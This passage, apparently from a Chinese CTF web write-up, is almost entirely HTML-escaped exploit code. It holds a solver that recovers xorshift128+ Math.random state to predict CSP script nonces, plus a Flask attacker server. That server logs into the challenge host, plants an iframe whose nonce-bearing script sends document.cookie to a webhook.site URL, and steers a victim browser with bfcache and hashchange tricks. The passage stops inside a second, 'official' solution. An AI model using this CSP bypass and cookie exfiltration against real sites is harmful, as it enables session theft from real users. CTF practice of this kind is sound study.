class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;)[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;assert&lt;/span&gt; BAs[i] != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (BAs[i]&amp;gt;&amp;gt;j)&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    Bbs[i] ^= Bbs[j]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        se_state0 = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.join([&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i) &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; Bbs[:&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;]]), &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        se_state1 = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.join([&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i) &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; Bbs[&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;:]]), &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        generated = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        full = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; generated &amp;lt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(sequence) + prefix_count + &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cached = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s1 = se_state0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s0 = se_state1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_state0 = se_s0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s1 ^= (se_s1 &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;23&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xffffffffffffffff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s1 ^= se_s1 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s1 ^= se_s0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_s1 ^= se_s0 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;26&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                se_state1 = se_s1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                cached.append(struct.unpack(&lt;span class=&#34;string&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;, struct.pack(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;Q&amp;quot;&lt;/span&gt;, (se_state0 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;) | &lt;span class=&#34;number&#34;&gt;0x3FF0000000000000&lt;/span&gt;))[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            generated += &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            full += cached[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        full = full[prefix_count:]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        full = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.join([alphabet[&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(v * &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(alphabet))] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; v &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; full])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;assert&lt;/span&gt; full[:&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(sequence)] == question&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans = full[&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(sequence):][:&lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ans&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ret = test_solution(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ret:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;raise&lt;/span&gt; Exception(&lt;span class=&#34;string&#34;&gt;&amp;#x27;no solution&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; bs4 &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; BeautifulSoup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sess = requests.Session()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;login&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;username, password&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; sess&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sess = requests.Session()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    url = &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://3.37.109.189:8080/login&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sess.post(url, data=&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;: username,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;: password&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;title, content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    url = &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://3.37.109.189:8080/write&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r = sess.post(url, data=&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;title&amp;#x27;&lt;/span&gt;: title,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;: content&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;share&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    url = &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://3.37.109.189:8080/share_diary/0&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r = sess.get(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Flask, request&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;index&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;lt;body&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;lt;script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            const genNonce = () =&amp;gt; &amp;quot;_&amp;quot;.repeat(8).replace(/_/g,()=&amp;gt;&amp;quot;abcdefghijklmnopqrstuvwxyz0123456789&amp;quot;.charAt(Math.random()*36));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            async function cc() &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                const url = &amp;#x27;http://localhost&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                let code = &amp;#x27;&amp;#x27;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                for (let i = 0; i &amp;lt; 15; i++) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                    let resp = await fetch(&amp;#x27;http://3.37.109.189:8080&amp;#x27; + &amp;#x27;/share/read&amp;#x27;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                    let text = await resp.text();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                    code += text.match(/nonce-[0-9a-z]+/)?.at(0).replace(&amp;#x27;nonce-&amp;#x27;, &amp;#x27;&amp;#x27;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                const userId = genNonce();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                let extra = open(url + &amp;#x27;/share/read#id=0&amp;amp;username=&amp;#x27; + encodeURIComponent(userId)) // will NOT throw exception if not created&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                console.log(code);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                let resp = await fetch(&amp;#x27;/solve?q=&amp;#x27; + encodeURIComponent(code) + &amp;#x27;&amp;amp;u=&amp;#x27; + encodeURIComponent(userId)); // get predicted nonce from server (with note created)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                let text = await resp.text();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                setTimeout(()=&amp;gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                    extra.location.href = &amp;quot;http://&amp;quot; + location.host + &amp;quot;/solve&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                    setTimeout(()=&amp;gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                        extra.history.go(-1); // reload, but with bfcache so that nonce won&amp;#x27;t change, and refresh the `hashchange` event trigger that has been deleted&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                        setTimeout(()=&amp;gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                            extra.location.href = url + &amp;#x27;/share/read#id=0&amp;amp;username=&amp;#x27; + encodeURIComponent(userId)+&amp;#x27;&amp;amp;34sdctycv&amp;#x27;; // trigger `hashchange`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                    &amp;#125;,1000)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                    &amp;#125;,1000)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                &amp;#125;, 1000);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            cc().catch((e)=&amp;gt;&amp;#123;fetch(&amp;#x27;https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/&amp;#x27;+e.toString())&amp;#125;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/solve&amp;#x27;&lt;/span&gt;, methods=[&lt;span class=&#34;string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sol&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    question = request.form.get(&lt;span class=&#34;string&#34;&gt;&amp;#x27;q&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; question:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        question = request.args.get(&lt;span class=&#34;string&#34;&gt;&amp;#x27;q&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; question:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;no question&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ans = solve(question, alphabet, sames_for)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(ans)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    user = request.args.get(&lt;span class=&#34;string&#34;&gt;&amp;#x27;u&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    login(user, user)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    write(&lt;span class=&#34;string&#34;&gt;&amp;#x27;test&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;f&amp;#x27;&amp;lt;iframe srcdoc=&amp;quot;&amp;lt;script nonce=&lt;span class=&#34;subst&#34;&gt;&amp;#123;ans[:&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;]&amp;#125;&lt;/span&gt;&amp;gt;fetch(`https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/?a=`+document.cookie)&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;&amp;lt;iframe&amp;gt;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    share()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app.run(&lt;span class=&#34;string&#34;&gt;&amp;#x27;0.0.0.0&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;5000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;附官方WP（使用socket进行通信持续控制页面，基于事件触发需要的更新，攻击者动态返回所需CSS）:&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span 